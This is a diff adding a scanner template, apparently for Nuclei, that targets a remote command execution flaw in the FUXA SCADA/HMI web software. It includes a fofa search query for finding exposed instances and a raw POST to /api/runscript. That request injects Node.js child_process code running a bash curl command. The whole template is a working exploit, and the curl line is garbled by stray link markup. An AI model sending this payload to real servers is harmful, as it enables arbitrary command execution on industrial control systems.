@@ -1,0 +1,48 @@
+id: poc-oiciid4m3recthg1
+info:
+  name: FUXA远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oiciid4m3recthg1'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oiciid4m3recthg1
+    fofa: title="FUXA"
+http:
+- raw:
+  - 'POST /api/runscript HTTP/1.1
+
+
+    Content-Type: application/json
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+
+
+    {"headers": {"normalizedNames": {}, "lazyUpdate": "null"}, "params": {"script": {"parameters": [{"name": "ok", "type": "tagid", "value": ""}], "mode": "", "id": "", "test": "true", "name": "ok", "outputId": "", "code": "require(''child_process'').exec(''/bin/bash -c \"curl [http://www.baidu.com\"'')"}}}](http://www.baidu.com%5C%22'')%22%7D%7D%7D)
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
